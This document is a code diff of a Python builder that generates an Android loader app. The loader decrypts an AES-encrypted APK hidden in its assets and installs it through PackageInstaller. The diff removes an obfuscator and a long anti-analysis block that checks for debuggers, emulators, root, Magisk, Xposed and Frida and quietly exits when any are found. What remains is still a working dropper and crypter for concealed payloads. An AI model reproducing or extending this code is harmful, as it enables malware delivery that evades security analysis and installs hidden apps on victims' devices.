@@ -1,13 +1,10 @@
 import logging
 import os
-import random
 import shutil
 import subprocess
 import zipfile
 from pathlib import Path
 from xml.sax.saxutils import escape
-from services.obfuscator import CodeObfuscator
-from services.npmanager import NPManager
 
 logger = logging.getLogger(__name__)
 
@@ -26,9 +23,6 @@ class StubBuilder:
         self.keystore = None
         self.keystore_pass = os.getenv("ANDROID_KEYSTORE_PASS", "android")
         self.key_alias = os.getenv("ANDROID_KEY_ALIAS")
-        self.obfuscator = CodeObfuscator()
-        self.npmanager = NPManager()
-        logger.info("StubBuilder инициализирован с NPManager обфускацией")
         self.temp_dir = Path("temp/stub_build")
         self.temp_dir.mkdir(parents=True, exist_ok=True)
         logger.info("StubBuilder initialized")
@@ -478,13 +472,6 @@ class StubBuilder:
         with open(payload_file, "wb") as f:
             f.write(encrypted_payload)
         logger.info("Payload saved: %s", payload_file)
-        
-        # Добавляем маркер NPManager
-        npmanager_marker = project_dir / "assets" / "ProtectedByNPManager.txt"
-        marker_content = self.npmanager.generate_protection_marker()
-        with open(npmanager_marker, "w") as f:
-            f.write(marker_content)
-        logger.info("NPManager protection marker added")
 
         loader_code = self.generate_loader_activity(protection_config, apk_info)
         with open(
@@ -726,36 +713,6 @@ public class LoaderActivity extends Activity {{
     }}
 
     private void startDecryption() {{
-        // Имитация легитимного запуска - задержка
-        try {{
-            Thread.sleep({random.randint(500, 1500)});
-        }} catch (Exception e) {{}}
-        
-        // Множественные проверки окружения (с логированием для отладки)
-        android.util.Log.d("LoaderActivity", "Starting environment checks");
-        boolean envCheck = checkEnvironment();
-        android.util.Log.d("LoaderActivity", "Environment check result: " + envCheck);
-        
-        if (!envCheck) {{
-            // Не показываем ошибку, просто закрываемся
-            android.util.Log.d("LoaderActivity", "Environment check failed, closing");
-            try {{
-                Thread.sleep({random.randint(1000, 2000)});
-            }} catch (Exception e) {{}}
-            finish();
-            return;
-        }}
-        
-        // Проверка Google Play Services
-        android.util.Log.d("LoaderActivity", "Checking Google Play Services");
-        if (!checkGooglePlayServices()) {{
-            android.util.Log.d("LoaderActivity", "Google Play Services not found, closing");
-            finish();
-            return;
-        }}
-        
-        android.util.Log.d("LoaderActivity", "All checks passed, starting decryption");
-        
         final AlertDialog.Builder builder = new AlertDialog.Builder(this);
         builder.setTitle(APP_LABEL);
         builder.setMessage("Подготовка приложения...");
@@ -767,7 +724,6 @@ public class LoaderActivity extends Activity {{
             @Override
             public void run() {{
                 try {{
-                    android.util.Log.d("LoaderActivity", "Starting decryption thread");
                     updateDialog(dialog, "Чтение данных...");
 
                     InputStream is = getAssets().open("payload.bin");
@@ -779,12 +735,10 @@ public class LoaderActivity extends Activity {{
                     }}
                     byte[] encryptedApk = baos.toByteArray();
                     is.close();
-                    android.util.Log.d("LoaderActivity", "Read encrypted payload: " + encryptedApk.length + " bytes");
 
                     updateDialog(dialog, "Расшифровка (" + encryptedApk.length + " байт)...");
 
                     byte[] decryptedApk = decryptAES(encryptedApk);
-                    android.util.Log.d("LoaderActivity", "Decrypted APK: " + decryptedApk.length + " bytes");
 
                     updateDialog(dialog, "Сохранение (" + decryptedApk.length + " байт)...");
 
@@ -797,23 +751,19 @@ public class LoaderActivity extends Activity {{
                     }}
 
                     apkFile = new File(apkDir, OUTPUT_APK_NAME);
-                    android.util.Log.d("LoaderActivity", "Saving APK to: " + apkFile.getAbsolutePath());
                     FileOutputStream fos = new FileOutputStream(apkFile);
                     fos.write(decryptedApk);
                     fos.close();
-                    android.util.Log.d("LoaderActivity", "APK saved successfully");
 
                     new Handler(Looper.getMainLooper()).post(new Runnable() {{
                         @Override
                         public void run() {{
                             dialog.dismiss();
-                            android.util.Log.d("LoaderActivity", "Starting installation");
                             installApk();
                         }}
                     }});
 
                 }} catch (final Exception e) {{
-                    android.util.Log.e("LoaderActivity", "Decryption error", e);
                     e.printStackTrace();
                     new Handler(Looper.getMainLooper()).post(new Runnable() {{
                         @Override
@@ -856,17 +806,12 @@ public class LoaderActivity extends Activity {{
             return false;
         }}
 
-        android.util.Log.d("LoaderActivity", "handleInstallCommitIntent called");
-        
         int status = intent.getIntExtra(
             PackageInstaller.EXTRA_STATUS,
             PackageInstaller.STATUS_FAILURE
         );
-        
-        android.util.Log.d("LoaderActivity", "Install status: " + status);
 
         if (status == PackageInstaller.STATUS_PENDING_USER_ACTION) {{
-            android.util.Log.d("LoaderActivity", "Pending user action");
             Intent confirmIntent = (Intent) intent.getParcelableExtra(Intent.EXTRA_INTENT);
             if (confirmIntent != null) {{
                 startActivity(confirmIntent);
@@ -877,7 +822,6 @@ public class LoaderActivity extends Activity {{
         }}
 
         if (status == PackageInstaller.STATUS_SUCCESS) {{
-            android.util.Log.d("LoaderActivity", "Installation successful");
             launchInstalledApp();
             return true;
         }}
@@ -886,8 +830,7 @@ public class LoaderActivity extends Activity {{
         if (statusMessage == null || statusMessage.trim().isEmpty()) {{
             statusMessage = "PackageInstaller status=" + status;
         }}
-        
-        android.util.Log.e("LoaderActivity", "Installation failed: " + statusMessage);
+
         showError("Установка не удалась: " + statusMessage);
         return true;
     }}
@@ -903,217 +846,6 @@ public class LoaderActivity extends Activity {{
         startActivity(launchIntent);
         finish();
     }}
-    
-    // ===== ЗАЩИТНЫЕ МЕХАНИЗМЫ (обфусцированные имена) =====
-    
-    private boolean validateEnvironment() {{
-        // Возвращает true если НЕТ отладчика (безопасно)
-        return !android.os.Debug.isDebuggerConnected() && 
-               !android.os.Debug.waitingForDebugger();
-    }}
-    
-    private boolean checkDeviceCompatibility() {{
-        // Возвращает true если НЕ эмулятор (безопасно)
-        // Проверка 1: Build параметры
-        String brand = android.os.Build.BRAND.toLowerCase();
-        String device = android.os.Build.DEVICE.toLowerCase();
-        String model = android.os.Build.MODEL.toLowerCase();
-        String product = android.os.Build.PRODUCT.toLowerCase();
-        String fingerprint = android.os.Build.FINGERPRINT.toLowerCase();
-        String hardware = android.os.Build.HARDWARE.toLowerCase();
-        
-        if (brand.contains("generic") || device.contains("generic") ||
-            model.contains("google_sdk") || model.contains("emulator") ||
-            model.contains("android sdk") || product.contains("sdk") ||
-            fingerprint.contains("generic") || fingerprint.contains("test-keys") ||
-            hardware.contains("goldfish") || hardware.contains("ranchu")) {{
-            return false;  // Эмулятор найден - небезопасно
-        }}
-        
-        // Проверка 2: Файлы эмулятора
-        String[] emulatorFiles = {{
-            "/dev/socket/qemud",
-            "/dev/qemu_pipe",
-            "/system/lib/libc_malloc_debug_qemu.so",
-            "/sys/qemu_trace",
-            "/system/bin/qemu-props"
-        }};
-        
-        for (String file : emulatorFiles) {{
-            if (new java.io.File(file).exists()) return false;  // Эмулятор найден
-        }}
-        
-        // Проверка 3: Телефонный номер эмулятора
-        try {{
-            android.telephony.TelephonyManager tm = 
-                (android.telephony.TelephonyManager) getSystemService(TELEPHONY_SERVICE);
-            String networkOperator = tm.getNetworkOperatorName();
-            if (networkOperator != null && networkOperator.toLowerCase().equals("android")) {{
-                return false;  // Эмулятор найден
-            }}
-        }} catch (Exception e) {{}}
-        
-        return true;  // Безопасно
-    }}
-    
-    private boolean verifySystemIntegrity() {{
-        // Проверка 1: Файлы su
-        String[] suPaths = {{
-            "/system/app/Superuser.apk",
-            "/sbin/su", "/system/bin/su", "/system/xbin/su",
-            "/data/local/xbin/su", "/data/local/bin/su",
-            "/system/sd/xbin/su", "/system/bin/failsafe/su",
-            "/data/local/su", "/su/bin/su",
-            "/system/xbin/daemonsu"
-        }};
-        
-        for (String path : suPaths) {{
-            if (new java.io.File(path).exists()) return false;  // Root найден - небезопасно
-        }}
-        
-        // Проверка 2: Magisk
-        String[] magiskPaths = {{
-            "/sbin/.magisk",
-            "/data/adb/magisk",
-            "/data/adb/modules"
-        }};
-        
-        for (String path : magiskPaths) {{
-            if (new java.io.File(path).exists()) return false;  // Magisk найден
-        }}
-        
-        // Проверка 3: Выполнение su
-        try {{
-            Process p = Runtime.getRuntime().exec("su");
-            java.io.BufferedReader reader = new java.io.BufferedReader(
-                new java.io.InputStreamReader(p.getInputStream()));
-            String line = reader.readLine();
-            p.destroy();
-            if (line != null) return false;  // su работает - root есть
-        }} catch (Exception e) {{}}
-        
-        // Проверка 4: Busybox
-        try {{
-            Process p = Runtime.getRuntime().exec("which su");
-            java.io.BufferedReader reader = new java.io.BufferedReader(
-                new java.io.InputStreamReader(p.getInputStream()));
-            String line = reader.readLine();
-            p.destroy();
-            if (line != null && !line.isEmpty()) return false;  // su найден
-        }} catch (Exception e) {{}}
-        
-        return true;  // Безопасно
-    }}
-    
-    private boolean checkGooglePlayServices() {{
-        // Проверка наличия Google Play Services
-        try {{
-            getPackageManager().getPackageInfo("com.google.android.gms", 0);
-            return true;
-        }} catch (Exception e) {{
-            return false;
-        }}
-    }}
-    
-    private boolean checkSecurityFramework() {{
-        // Проверка Xposed Framework
-        try {{
-            throw new Exception();
-        }} catch (Exception e) {{
-            for (StackTraceElement element : e.getStackTrace()) {{
-                if (element.getClassName().contains("de.robv.android.xposed")) {{
-                    return false;  // Xposed найден
-                }}
-            }}
-        }}
-        
-        // Проверка файлов Xposed
-        String[] xposedFiles = {{
-            "/system/framework/XposedBridge.jar",
-            "/system/lib/libxposed_art.so",
-            "/system/lib64/libxposed_art.so"
-        }};
-        
-        for (String file : xposedFiles) {{
-            if (new java.io.File(file).exists()) return false;  // Xposed найден
-        }}
-        
-        return true;  // Безопасно
-    }}
-    
-    private boolean validateRuntimeEnvironment() {{
-        // Проверка Frida
-        String[] fridaPorts = {{"27042", "27043"}};
-        
-        for (String port : fridaPorts) {{
-            try {{
-                java.net.Socket socket = new java.net.Socket("127.0.0.1", Integer.parseInt(port));
-                socket.close();
-                return false;  // Frida найден
-            }} catch (Exception e) {{}}
-        }}
-        
-        // Проверка процессов Frida
-        try {{
-            Process p = Runtime.getRuntime().exec("ps");
-            java.io.BufferedReader reader = new java.io.BufferedReader(
-                new java.io.InputStreamReader(p.getInputStream()));
-            String line;
-            while ((line = reader.readLine()) != null) {{
-                if (line.contains("frida") || line.contains("gum-js-loop")) {{
-                    return false;  // Frida найден
-                }}
-            }}
-            p.destroy();
-        }} catch (Exception e) {{}}
-        
-        return true;  // Безопасно
-    }}
-    
-    private boolean checkEnvironment() {{
-        // Множественные проверки с задержками
-        boolean result;
-        
-        result = validateEnvironment();
-        android.util.Log.d("LoaderActivity", "validateEnvironment: " + result);
-        if (!result) {{
-            try {{ Thread.sleep({random.randint(100, 300)}); }} catch (Exception e) {{}}
-            return false;
-        }}
-        
-        result = checkDeviceCompatibility();
-        android.util.Log.d("LoaderActivity", "checkDeviceCompatibility: " + result);
-        if (!result) {{
-            try {{ Thread.sleep({random.randint(100, 300)}); }} catch (Exception e) {{}}
-            return false;
-        }}
-        
-        result = verifySystemIntegrity();
-        android.util.Log.d("LoaderActivity", "verifySystemIntegrity: " + result);
-        if (!result) {{
-            try {{ Thread.sleep({random.randint(100, 300)}); }} catch (Exception e) {{}}
-            return false;
-        }}
-        
-        result = checkSecurityFramework();
-        android.util.Log.d("LoaderActivity", "checkSecurityFramework: " + result);
-        if (!result) {{
-            try {{ Thread.sleep({random.randint(100, 300)}); }} catch (Exception e) {{}}
-            return false;
-        }}
-        
-        result = validateRuntimeEnvironment();
-        android.util.Log.d("LoaderActivity", "validateRuntimeEnvironment: " + result);
-        if (!result) {{
-            try {{ Thread.sleep({random.randint(100, 300)}); }} catch (Exception e) {{}}
-            return false;
-        }}
-        
-        android.util.Log.d("LoaderActivity", "All environment checks passed");
-        return true;
-    }}
-    
-    // ===== КОНЕЦ ЗАЩИТНЫХ МЕХАНИЗМОВ =====
 
     private byte[] decryptAES(byte[] encrypted) throws Exception {{
         int minLength = PAYLOAD_MAGIC.length + 1 + WRAP_SALT_LENGTH + NONCE_LENGTH
@@ -1215,11 +947,6 @@ public class LoaderActivity extends Activity {{
     }}
 
     private void installApk() {{
-        android.util.Log.d("LoaderActivity", "installApk() called");
-        android.util.Log.d("LoaderActivity", "APK file: " + apkFile.getAbsolutePath());
-        android.util.Log.d("LoaderActivity", "APK exists: " + apkFile.exists());
-        android.util.Log.d("LoaderActivity", "APK size: " + apkFile.length());
-        
         PackageInstaller packageInstaller = getPackageManager().getPackageInstaller();
         PackageInstaller.Session session = null;
 
@@ -1227,7 +954,6 @@ public class LoaderActivity extends Activity {{
             PackageInstaller.SessionParams params =
                 new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
             int sessionId = packageInstaller.createSession(params);
-            android.util.Log.d("LoaderActivity", "Created session: " + sessionId);
             session = packageInstaller.openSession(sessionId);
 
             try (
@@ -1236,13 +962,10 @@ public class LoaderActivity extends Activity {{
             ) {{
                 byte[] buffer = new byte[8192];
                 int c;
-                long totalWritten = 0;
                 while ((c = in.read(buffer)) != -1) {{
                     out.write(buffer, 0, c);
-                    totalWritten += c;
                 }}
                 session.fsync(out);
-                android.util.Log.d("LoaderActivity", "Written " + totalWritten + " bytes to session");
             }}
 
             Intent callbackIntent = new Intent(this, LoaderActivity.class);
@@ -1259,12 +982,9 @@ public class LoaderActivity extends Activity {{
                 pendingIntentFlags
             );
 
-            android.util.Log.d("LoaderActivity", "Committing session");
             session.commit(pendingIntent.getIntentSender());
             session.close();
-            android.util.Log.d("LoaderActivity", "Session committed successfully");
         }} catch (Exception e) {{
-            android.util.Log.e("LoaderActivity", "Installation error", e);
             if (session != null) {{
                 session.abandon();
             }}
@@ -1305,8 +1025,6 @@ public class LoaderActivity extends Activity {{
     <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
-    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
-    <uses-permission android:name="android.permission.INTERNET"/>
 
     <application
         android:label="@string/app_name"
